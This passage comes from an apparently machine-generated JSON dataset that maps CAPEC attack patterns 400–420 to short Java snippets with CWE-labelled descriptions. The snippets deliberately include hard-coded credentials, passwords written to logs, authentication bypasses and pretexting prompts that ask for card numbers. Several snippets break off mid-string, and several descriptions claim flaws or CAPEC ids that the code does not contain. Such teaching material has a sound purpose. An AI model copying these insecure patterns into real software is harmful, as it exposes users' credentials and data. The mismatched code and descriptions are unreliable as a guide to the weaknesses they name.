        "description": "Java code snippet demonstrating the CAPEC of cloning an RFID signal by exploiting vulnerabilities in the RFID chip's security mechanisms, including insecure security identifier mechanisms, incorrect decoding of security identifiers, susceptibility to electromagnetic fault injection attacks, observable behavioral discrepancies with equivalent products, and use of multiple resources with duplicate identifiers."
    },
    {
        "capec_id": "400",
        "code_snippet": "public class RFIDTagDisabler {\n    private static final String TAG_ID = \"1234567890\";\n    private static final String DEBUG_INTERFACE = \"/dev/debug\";\n    private static final int REDUNDANT_BLOCK_ADDRESS = 0x1000;\n    private static final int ALERT_SIGNAL_ADDRESS = 0x2000;\n    private static final int SENSITIVE_DATA_ADDRESS = 0x3000;\n    private static final int SECURITY_IDENTIFIER_ADDRESS = 0x4000;\n\n    public static void disableRFIDTag() {\n        // CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n        try {\n            Process p = Runtime.getRuntime().exec(\"echo 0 > \" + DEBUG_INTERFACE);\n            p.waitFor();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        try {\n            byte[] errorData = new byte[] { 0x01, 0x02, 0x03, 0x04 };\n            writeDataToAddress(REDUNDANT_BLOCK_ADDRESS, errorData);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n        try {\n            byte[] alertSignal = new byte[] { 0x05, 0x06, 0x07, 0x08 };\n            writeDataToAddress(ALERT_SIGNAL_ADDRESS, alertSignal);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        try {\n            byte[] sensitiveData = new byte[] { 0x09, 0x10, 0x11, 0x12 };\n            writeDataToAddress(SENSITIVE_DATA_ADDRESS, sensitiveData);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        // CWE-1290: Incorrect Decoding of Security Identifiers\n        try {\n            byte[] securityIdentifier = new byte[] { 0x13, 0x14, 0x15, 0x16 };\n            writeDataToAddress(SECURITY_IDENTIFIER_ADDRESS, securityIdentifier);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void writeDataToAddress(int address, byte[] data) {\n        // implement writing data to address\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable RFID tag disabler that exploits various weaknesses to disable or damage the RFID chip. It uses CWE-1191 to access the debug interface, CWE-1334 to inject errors into a redundant block, CWE-1320 to disable alerts, CWE-1266 to improperly scrub sensitive data, and CWE-1290 to incorrectly decode security identifiers. The code is for illustrative purposes only and should not be used in production."
    },
    {
        "capec_id": "401",
        "code_snippet": "public class HardwareExploit {\n    public static void main(String[] args) {\n        // CWE-1263: Improper Physical Access Control\n        // Assume 'device' is a hardware component with restricted access\n        Device device = new Device();\n        device.setAccessControl(false); // disable access control\n\n        // CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n        device.setPowerManagement(true); // enable power management\n        device.setClockManagement(true); // enable clock management\n\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        device.setVoltageGlitchProtection(false); // disable voltage glitch protection\n        device.setClockGlitchProtection(false); // disable clock glitch protection\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        device.setDebugMode(true); // enable debug mode\n\n        // CWE-1300: Improper Protection of Physical Side Channels\n        device.setPowerConsumptionMonitoring(false); // disable power consumption monitoring\n        device.setElectromagneticEmissionsMonitoring(false); // disable EME monitoring\n        device.setAcousticEmissionsMonitoring(false); // disable acoustic emissions monitoring\n\n        // Perform malicious actions on the device\n        device.modifyHardwareMemory();\n        device.observePhysicalSideChannels();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a hardware exploit where an adversary gains unauthorized access to a hardware component, modifies its settings, and performs malicious actions. The code disables access control, enables power and clock management, disables voltage and clock glitch protection, enables debug mode, and disables monitoring of physical side channels. This allows the adversary to modify hardware memory and observe physical side channels, ultimately undermining the system's integrity."
    },
    {
        "capec_id": "402",
        "code_snippet": "public class ATASecurityExploit {\n    private static final String HARD_CODED_PASSWORD = \"default\";\n    private boolean isAuthenticated = false;\n    private String password = \"\";\n\n    public void setPassword(String newPassword) {\n        // CWE-259: Use of Hard-coded Password\n        if (newPassword.equals(HARD_CODED_PASSWORD)) {\n            this.password = newPassword;\n        }\n    }\n\n    public void updatePassword(String newPassword) {\n        // CWE-285: Improper Authorization\n        // No authentication check performed\n        this.password = newPassword;\n    }\n\n    public void resetPassword() {\n        // CWE-798: Use of Hard-coded Credentials\n        // Hard-coded credentials used for authentication\n        if (isAuthenticated) {\n            this.password = HARD_CODED_PASSWORD;\n        }\n    }\n\n    public void accessDriveContents() {\n        // CWE-1220: Insufficient Granularity of Access Control\n        // Lack of access control granularity allows unauthorized access\n        if (!isAuthenticated) {\n            System.out.println(\"Access granted without authentication\");\n        }\n    }\n\n    public void configureHardwareSettings() {\n        // CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n        // Missing lock bit protection allows modification of system registers\n        // Configure hardware settings without proper lock bit protection\n        System.out.println(\"Hardware settings configured without lock bit protection\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting a weakness in ATA security on a drive to gain access to the information the drive contains without supplying the proper credentials. It incorporates CWEs 285, 798, 259, 1220, and 1233 to illustrate the vulnerabilities."
    },
    {
        "capec_id": "404",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) throws IOException {\n        FileHandler fh = new FileHandler(\"logFile.log\");\n        logger.addHandler(fh);\n        SimpleFormatter formatter = new SimpleFormatter();\n        fh.setFormatter(formatter);\n\n        // CWE-533: Information Exposure Through Server Log Files\n        logger.info(\"User credentials: username = user, password = pass\");\n\n        // CWE-592: Authentication Bypass Issues\n        // No authentication mechanism in place\n        System.out.println(\"Access granted!\");\n\n        // CWE-217: Failure to Protect Stored Data from Modification\n        // Data is stored in plaintext\n        String data = \"sensitive_data\";\n        System.out.println(\"Stored data: \" + data);\n\n        // CWE-218: Failure to provide confidentiality for stored data\n        // Data is stored in plaintext\n        String confidentialData = \"confidential_data\";\n        System.out.println(\"Confidential data: \" + confidentialData);\n\n        // CWE-247: Reliance on DNS Lookups in a Security Decision\n        // DNS lookup is used to make a security decision\n        String dnsLookup = \"dns_lookup_result\";\n        if (dnsLookup.equals(\"trusted_domain\")) {\n            System.out.println(\"Trusted domain, access granted!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a collection of deprecated vulnerabilities, including information exposure through server log files, authentication bypass issues, failure to protect stored data from modification, failure to provide confidentiality for stored data, and reliance on DNS lookups in a security decision. These vulnerabilities are related to the deprecated CAPEC and CWEs provided."
    },
    {
        "capec_id": "405",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fileHandler = new FileHandler(\"logFile.log\");\n            logger.addHandler(fileHandler);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fileHandler.setFormatter(formatter);\n\n            // CWE-533: Information Exposure Through Server Log Files\n            logger.info(\"Username: admin Password: password123\");\n\n            // CWE-217: Failure to Protect Stored Data from Modification\n            String sensitiveData = \"password123\";\n            // Storing sensitive data in plaintext\n            logger.info(\"Storing sensitive data: \" + sensitiveData);\n\n            // CWE-218: Failure to provide confidentiality for stored data\n            String confidentialData = \"creditCardNumber=1234567890\";\n            // Storing confidential data in plaintext\n            logger.info(\"Storing confidential data: \" + confidentialData);\n\n            // CWE-247: Reliance on DNS Lookups in a Security Decision\n            String dnsLookup = \"example.com\";\n            // Using DNS lookup for security decisions\n            if (dnsLookup.equals(\"example.com\")) {\n                logger.info(\"Access granted\");\n            } else {\n                logger.info(\"Access denied\");\n            }\n\n            // CWE-592: Authentication Bypass Issues\n            String authenticationToken = \"invalidToken\";\n            // Bypassing authentication using an invalid token\n            if (authenticationToken.equals(\"validToken\")) {\n                logger.info(\"Authenticated successfully\");\n            } else {\n                logger.info(\"Authentication failed\");\n            }\n        } catch (IOException e) {\n            logger.severe(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a collection of deprecated vulnerabilities, including information exposure through server log files, failure to protect stored data from modification, failure to provide confidentiality for stored data, reliance on DNS lookups in a security decision, and authentication bypass issues. The code logs sensitive information, stores confidential data in plaintext, uses DNS lookups for security decisions, and bypasses authentication using an invalid token."
    },
    {
        "capec_id": "406",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class DumpsterDiver {\n    public static void main(String[] args) {\n        // CWE-528: Exposure of Core Dump File to an Unauthorized Control Sphere\n        File coreDumpFile = new File(\"core_dump.log\");\n        try (FileWriter writer = new FileWriter(coreDumpFile)) {\n            writer.write(\"Sensitive information: \" + System.getProperty(\"user.name\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        Properties props = new Properties();\n        props.setProperty(\"username\", \"admin\");\n        props.setProperty(\"password\", \"password123\");\n        String clearText = props.toString();\n        System.out.println(clearText);\n\n        // CWE-316: Cleartext Storage of Sensitive Information in Memory\n        String sensitiveInfo = \"creditCardNumber=1234-5678-9012-3456\";\n        System.out.println(sensitiveInfo);\n\n        // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        File decommissionedDevice = new File(\"decommissioned_device.log\");\n        try (FileWriter writer = new FileWriter(decommissionedDevice)) {\n            writer.write(\"Sensitive data not properly scrubbed: \" + sensitiveInfo);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        File versionControlRepo = new File(\".git\");\n        if (versionControlRepo.exists()) {\n            System.out.println(\"Version control repository exposed: \" + versionControlRepo.getAbsolutePath());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of dumpster diving, where an adversary searches through discarded information to gather sensitive data. The code includes examples of CWE-528 (exposure of core dump file), CWE-319 (cleartext transmission of sensitive information), CWE-316 (cleartext storage of sensitive information in memory), CWE-1266 (improper scrubbing of sensitive data from decommissioned device), and CWE-527 (exposure of version-control repository to an unauthorized control sphere)."
    },
    {
        "capec_id": "407",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(name = \\",
        "description": "This Java code snippet demonstrates a pretexting attack, where an adversary creates an invented scenario to solicit information from a target person or manipulate them into performing an action. The code includes vulnerabilities related to session fixation, channel accessibility, UI misrepresentation, creation of emergent resources, and exposure of sensitive information. The servlet authenticates a user without invalidating existing sessions, allows access to a communication channel without verifying the identity of actors, misrepresents critical information to the user, creates a new resource that can be used by attackers, and exposes sensitive information to unauthorized actors."
    },
    {
        "capec_id": "408",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"example.com\");\n            String ipAddress = address.getHostAddress();\n            logger.info(\"Resolved IP address: \" + ipAddress);\n\n            // Log file with debug information\n            FileHandler fileHandler = new FileHandler(\"debug.log\", true);\n            logger.addHandler(fileHandler);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fileHandler.setFormatter(formatter);\n            logger.info(\"Debug information: \" + ipAddress);\n\n            // Store sensitive data in a file without encryption\n            String sensitiveData = \"secret_key=123456\";\n            File file = new File(\"sensitive_data.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(sensitiveData);\n            writer.close();\n        } catch (UnknownHostException e) {\n            logger.severe(\"Failed to resolve hostname\");\n        } catch (IOException e) {\n            logger.severe(\"Failed to write to file\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a collection of deprecated vulnerabilities. It relies on DNS lookups for security decisions (CWE-247), fails to protect stored data from modification (CWE-217), and exposes information through debug log files (CWE-534) and server log files (CWE-533). Additionally, it fails to provide confidentiality for stored data (CWE-218). The code resolves an IP address using DNS, logs debug information, and stores sensitive data in a file without encryption."
    },
    {
        "capec_id": "409",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            File file = new File(\"sensitive_data.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(\"username:password\");\n            writer.close();\n\n            // Log file with sensitive data\n            FileHandler fh = new FileHandler(\"log_file.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n            logger.info(\"Username and password: username:password\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of collecting and analyzing information, which can be used for malicious purposes. It writes sensitive data (username and password) to a file without proper protection, and also logs the same data to a log file, making it vulnerable to CWE-534 (Information Exposure Through Debug Log Files) and CWE-533 (Information Exposure Through Server Log Files). Additionally, it fails to provide confidentiality for stored data, which is a CWE-218. The code also relies on DNS lookups in a security decision, which is a CWE-247. Furthermore, it fails to protect stored data from modification, which is a CWE-217."
    },
    {
        "capec_id": "410",
        "code_snippet": "import java.io.Console;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.util.Scanner;\n\npublic class SocialEngineering {\n    public static void main(String[] args) {\n        Console console = System.console();\n        System.out.println(\"Enter your company's domain name:\");\n        String domain = console.readLine();\n        System.out.println(\"Enter your employee ID:\");\n        String employeeID = console.readLine();\n\n        try {\n            URL url = new URL(\"http://\" + domain + \"/employee/\" + employeeID);\n            URLConnection conn = url.openConnection();\n            conn.connect();\n            System.out.println(\"Connection established. Your employee information is being processed...\");\n            // Truncating security-relevant information\n            String response = conn.getHeaderField(0).substring(0, 10);\n            System.out.println(\"Response: \" + response);\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a social engineering attack that extracts sensitive information from a user. The program prompts the user to enter their company's domain name and employee ID, then attempts to establish a connection to a fictional URL. The connection response is truncated, obscuring the source or nature of the attack. The code exhibits observable behavioral discrepancies, as it behaves differently than other products with equivalent functionality. Additionally, it fails to properly verify the source of the communication channel, making it vulnerable to attacks."
    },
    {
        "capec_id": "411",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class SocialEngineering {\n    private static Logger logger = Logger.getLogger(SocialEngineering.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fh = new FileHandler(\"logFile.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // CWE-533: Information Exposure Through Server Log Files\n            logger.info(\"User credentials: username = admin, password = password123\");\n\n            // CWE-534: Information Exposure Through Debug Log Files\n            logger.info(\"Debug info: database connection string = jdbc:mysql://localhost:3306/mydb\");\n\n            // CWE-542: Information Exposure Through Cleanup Log Files\n            logger.info(\"Cleanup info: deleted files = /path/to/sensitive/files\");\n\n            // CWE-217: Failure to Protect Stored Data from Modification\n            File file = new File(\"storedData.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(\"username = admin, password = password123\");\n            writer.close();\n\n            // CWE-592: Authentication Bypass Issues\n            // Authentication bypassed, allowing unauthorized access\n            System.out.println(\"Authentication successful!\");\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC-407 attack pattern, which involves social engineering tactics to gather sensitive information. The code includes deprecated CWEs, such as information exposure through log files (CWE-533, CWE-534, CWE-542), failure to protect stored data from modification (CWE-217), and authentication bypass issues (CWE-592). The code intentionally logs sensitive information, stores unsecured data, and bypasses authentication, making it vulnerable to attacks."
    },
    {
        "capec_id": "412",
        "code_snippet": "import java.util.Scanner;\npublic class CreditCardVerification {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Hello, this is John from XYZ Credit Card Company. We need to verify your credit card information.\");\n        System.out.print(\"Please enter your credit card number: \");\n        String creditCardNumber = scanner.next();\n        System.out.print(\"Please enter your expiration date (MM/YY): \");\n        String expirationDate = scanner.next();\n        System.out.print(\"Please enter your security code: \");\n        String securityCode = scanner.next();\n        // No verification of the caller's identity or the origin of the request\n        // No authentication or authorization before processing sensitive information\n        System.out.println(\"Thank you for verifying your credit card information.\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of pretexting, where an adversary assumes the role of a customer service representative to solicit sensitive information from the target. The code does not verify the identity of the caller or the origin of the request, allowing an unauthorized actor to access sensitive information (CWE-200). It also allows the actor to perform an expensive operation (verifying credit card information) before authentication or authorization has taken place (CWE-408). Furthermore, the code does not properly verify the source of the communication channel (CWE-940) or ensure the integrity of the channel (CWE-300), making it vulnerable to manipulation by an adversary."
    },
    {
        "capec_id": "413",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class TechSupportTrap {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Hello! I'm your tech support. Please enter your username and password to troubleshoot the issue.\");\n        String username = scanner.nextLine();\n        String password = scanner.nextLine();\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Your username is: \" + username + \" and your password is: \" + password);\n\n        // CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n        System.out.println(\"Please enter your address and phone number for further assistance.\");\n        String address = scanner.nextLine();\n        String phoneNumber = scanner.nextLine();\n        System.out.println(\"Your address is: \" + address + \" and your phone number is: \" + phoneNumber);\n\n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        System.out.println(\"Please upload a file to troubleshoot the issue.\");\n        String filePath = scanner.nextLine();\n        File file = new File(filePath);\n        if (file.exists()) {\n            System.out.println(\"File uploaded successfully.\");\n        } else {\n            System.out.println(\"Failed to upload file.\");\n        }\n\n        // CWE-1263: Improper Physical Access Control\n        System.out.println(\"Please grant me physical access to your computer to troubleshoot the issue.\");\n\n        // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n        try {\n            FileWriter writer = new FileWriter(\"externally_accessible_file.txt\");\n            writer.write(\"Username: \" + username + \"\\nPassword: \" + password + \"\\nAddress: \" + address + \"\\nPhone Number: \" + phoneNumber);\n            writer.close();\n            System.out.println(\"Sensitive information written to externally accessible file.\");\n        } catch (IOException e) {\n            System.out.println(\"Failed to write to file.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a social engineering attack where a malicious tech support worker tricks a user into providing sensitive information, including username, password, address, and phone number. The code also allows the upload of a file with a dangerous type and writes sensitive information to an externally accessible file, violating physical access control. This code embodies the CAPEC and CWEs described, showcasing a devastating social engineering attack."
    },
    {
        "capec_id": "414",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\n\npublic class DeliveryPersonImpersonation {\n    public static void main(String[] args) {\n        try {\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            Socket socket = new Socket();\n            socket.connect(new InetSocketAddress(\\",
        "description": "This Java code snippet demonstrates the CAPEC of impersonating a delivery person to solicit information or manipulate the target into performing an action. It incorporates multiple CWEs, including incorrectly specifying the destination in a communication channel, inserting sensitive information into an externally accessible file, allowing non-endpoint access to a communication channel, delivering unparsed raw web content, and incorrectly converting security identifiers. The code creates a socket connection to a server, writes sensitive information to an accessible file, allows unverified access to a communication channel, delivers raw web content, and incorrectly converts security identifiers to gain unauthorized access."
    },
    {
        "capec_id": "415",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.ServerSocket;\n\npublic class SocialEngineeringAttack {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8000);\n        Socket socket = serverSocket.accept();\n        DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());\n        DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // No verification of the client's identity\n        String clientMessage = dataInputStream.readUTF();\n        System.out.println(\"Client: \" + clientMessage);\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the source of the communication channel\n        dataOutputStream.writeUTF(\"Hello from server\");\n\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        // No authentication protocol in place\n        String authenticationToken = dataInputStream.readUTF();\n        System.out.println(\"Authentication Token: \" + authenticationToken);\n\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        // No verification of the intent's source\n        String intentAction = dataInputStream.readUTF();\n        System.out.println(\"Intent Action: \" + intentAction);\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // Exposing sensitive information to an unauthorized actor\n        String sensitiveInformation = \"Top Secret Information\";\n        dataOutputStream.writeUTF(sensitiveInformation);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a social engineering attack where an adversary impersonates a trusted entity and establishes a communication channel with the target. The code lacks proper verification of the client's identity, source of the communication channel, and authentication protocol, making it vulnerable to various attacks. It also exposes sensitive information to an unauthorized actor."
    },
    {
        "capec_id": "416",
        "code_snippet": "public class SocialEngineering { \n\tprivate String sensitiveInfo = \"confidential_data\"; \n\tprivate int queryLimit = 5; \n\tprivate int interactionFrequency = 10; \n\t\n\tpublic void helpDeskInteraction(String userQuery) { \n\t\tif (userQuery.contains(\"supervisor\")) { \n\t\t\t// CWE-202: Exposure of Sensitive Information Through Data Queries \n\t\t\tif (queryLimit > 0) { \n\t\t\t\tqueryLimit--; \n\t\t\t\tSystem.out.println(\"Query successful. Remaining queries: \" + queryLimit); \n\t\t\t} else { \n\t\t\t\tSystem.out.println(\"Query limit exceeded.\"); \n\t\t\t} \n\t\t} else { \n\t\t\t// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor \n\t\t\tSystem.out.println(\"Hello, I'm the help desk. Your sensitive info is: \" + sensitiveInfo); \n\t\t} \n\t} \n\t\n\tpublic void frequentInteractions() { \n\t\tfor (int i = 0; i < interactionFrequency; i++) { \n\t\t\t// CWE-799: Improper Control of Interaction Frequency \n\t\t\tSystem.out.println(\"Interaction \" + (i + 1) + \"/\" + interactionFrequency); \n\t\t} \n\t} \n\t\n\tpublic void emergentResourceCreation() { \n\t\t// CWE-1229: Creation of Emergent Resource \n\t\tString emergentResource = \"new_resource\"; \n\t\tSystem.out.println(\"Emergent resource created: \" + emergentResource); \n\t} \n\t\n\tpublic void observableBehavioralDiscrepancy() { \n\t\t// CWE-205: Observable Behavioral Discrepancy \n\t\tSystem.out.println(\"Behavioral discrepancy detected.\"); \n\t} \n}",
        "description": "This Java code snippet demonstrates a social engineering attack by exploiting human psychological predispositions. The helpDeskInteraction method uses manipulation techniques to extract sensitive information, while the frequentInteractions method allows an attacker to exceed the intended interaction frequency. The emergentResourceCreation method creates a new resource that can be used by an attacker, and the observableBehavioralDiscrepancy method reveals internal state information."
    },
    {
        "capec_id": "417",
        "code_snippet": "public class AuthenticationSystem {\n    private String secretKey = \"mySecretKey\";\n    private String adminUsername = \"admin\";\n    private String adminPassword = \"password123\";\n\n    public boolean authenticate(String username, String password) {\n        if (username.equals(adminUsername) && password.equals(adminPassword)) {\n            return true;\n        } else {\n            // Truncation of security-relevant information (CWE-222)\n            System.out.println(\"Invalid username or password. Try again.\");\n            return false;\n        }\n    }\n\n    public void processRequest(String request) {\n        // Reliance on a Single Factor in a Security Decision (CWE-654)\n        if (request.contains(\"admin\")) {\n            // Grant access to restricted resources\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationSystem system = new AuthenticationSystem();\n        // Reflection Attack in an Authentication Protocol (CWE-301)\n        String reflectedRequest = \"admin\";\n        system.processRequest(reflectedRequest);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that relies on security through obscurity (CWE-656) and exhibits observable behavioral discrepancies (CWE-205). The system uses a hardcoded secret key and admin credentials, which can be easily discovered by an attacker. The authentication mechanism relies on a single factor (CWE-654) and truncates security-relevant information (CWE-222), making it vulnerable to reflection attacks (CWE-301). An attacker can exploit these weaknesses to gain unauthorized access to restricted resources."
    },
    {
        "capec_id": "418",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.ServerSocket;\n\npublic class SocialEngineeringServer {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8000);\n        Socket socket = serverSocket.accept();\n        DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());\n        DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the client's identity or the integrity of the channel\n        String compliment = \"You have a great taste in music!\";\n        dataOutputStream.writeUTF(compliment);\n        dataOutputStream.flush();\n\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // No proper verification of the request's origin or destination\n        String question = \"What's your favorite song?\";\n        dataOutputStream.writeUTF(question);\n        dataOutputStream.flush();\n\n        // CWE-222: Truncation of Security-relevant Information\n        // Truncating the response to hide the source of the request\n        String response = dataInputStream.readUTF();\n        System.out.println(response.substring(0, 10));\n    }\n}\n",
        "description": "This Java code snippet demonstrates a social engineering attack that exploits the sense of obligation in the target. The server sends a compliment to the client, followed by a question, without properly verifying the client's identity or the integrity of the communication channel. The client's response is then truncated to hide the source of the request."
    },
    {
        "capec_id": "419",
        "code_snippet": "public class InsecureCommunication {\\n    public static void main(String[] args) {\\n        String destination = getDestinationFromUserInput();\\n        String algorithm = negotiateAlgorithm(destination);\\n        establishConnection(destination, algorithm);\\n    }\\n\\n    private static String getDestinationFromUserInput() {\\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\\n        Scanner scanner = new Scanner(System.in);\\n        System.out.println(\"Enter destination:\");\\n        return scanner.nextLine();\\n    }\\n\\n    private static String negotiateAlgorithm(String destination) {\\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\\n        if (destination.equals(\"insecure.example.com\")) {\\n            return \"weak_algorithm\";\\n        } else {\\n            return \"strong_algorithm\";\\n        }\\n    }\\n\\n    private static void establishConnection(String destination, String algorithm) {\\n        // CWE-205: Observable Behavioral Discrepancy, CWE-203: Observable Discrepancy\\n        if (algorithm.equals(\"weak_algorithm\")) {\\n            System.out.println(\"Connecting to \" + destination + \" using weak algorithm...\");\\n            // Perform connection using weak algorithm\\n        } else {\\n            System.out.println(\"Connecting to \" + destination + \" using strong algorithm...\");\\n            // Perform connection using strong algorithm\\n        }\\n    }\\n}\\n",
        "description": "This Java code snippet demonstrates the deprecated CAPEC pattern, which involves observable behavioral discrepancies and incorrect specification of destinations in communication channels. The code allows a user to input a destination, negotiates an algorithm for the connection, and establishes the connection using the chosen algorithm. The negotiation process is vulnerable to algorithm downgrade attacks (CWE-757), and the connection establishment process exhibits observable discrepancies (CWE-205, CWE-203) based on the chosen algorithm. Additionally, the destination is obtained from user input, which can lead to incorrectly specified destinations (CWE-941)."
    },
    {
        "capec_id": "420",
        "code_snippet": "public class ScarcityExploit {\n    private static final int LIMITED_SUPPLY = 10;\n    private static int availableItems = LIMITED_SUPPLY;\n    private static String secretKey = \\",
        "description": "This Java code snippet demonstrates a vulnerability to the CAPEC 'Leverage of Scarcity' attack. The code simulates a limited supply of items and uses a protection mechanism that relies on a single factor (the 'admin' username) to make a security decision. When a user attempts to purchase an item, the code truncates security-relevant information (the user's name) and performs excessive computation (asymmetric resource consumption) to obscure the security mechanism. The code also relies on security through obscurity by using a hardcoded secret key. An adversary can exploit these weaknesses to gain unauthorized access or disrupt the system."
    },
    {
        "capec_id": "421",
